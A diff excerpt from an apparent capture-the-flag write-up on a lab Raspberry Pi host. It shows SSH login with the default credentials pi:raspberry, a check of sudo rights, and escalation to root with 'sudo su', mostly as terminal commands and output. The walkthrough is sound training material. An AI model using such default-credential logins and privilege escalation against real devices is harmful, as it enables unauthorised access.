@@ -78,4 +78,68 @@ Searching for default cred gives this `pi:raspberry`
 Trying to login with that doesn't work
 ![image](https://user-images.githubusercontent.com/113513376/216254277-4ea1f3b3-2b63-4a22-add9-1e0de6e1294e.png)
 
+But on trying it on ssh works 
 
+```
+└─$ ssh pi@10.10.10.48
+The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
+ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.48' (ED25519) to the list of known hosts.
+pi@10.10.10.48's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 27 14:47:50 2017 from localhost
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+
+SSH is enabled and the default password for the 'pi' user has not been changed.
+This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.
+
+pi@raspberrypi:~$ 
+```
+
+Now lets escalate priv
+
+Checking sudo perm shows we can run all as root
+
+```
+pi@raspberrypi:~$ sudo -l
+Matching Defaults entries for pi on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User pi may run the following commands on localhost:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+pi@raspberrypi:~$
+```
+
+So lets get root 
+
+```
+pi@raspberrypi:~$ sudo su
+root@raspberrypi:/home/pi# cd /root
+root@raspberrypi:~# ls -al
+total 22
+drwx------  3 root root 4096 Aug 27  2017 .
+drwxr-xr-x 35 root root 4096 Aug 14  2017 ..
+-rw-------  1 root root  549 Dec 24  2017 .bash_history
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+-rw-r--r--  1 root root   76 Aug 14  2017 root.txt
+drwx------  2 root root 4096 Aug 27  2017 .ssh
+root@raspberrypi:~#
+```
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
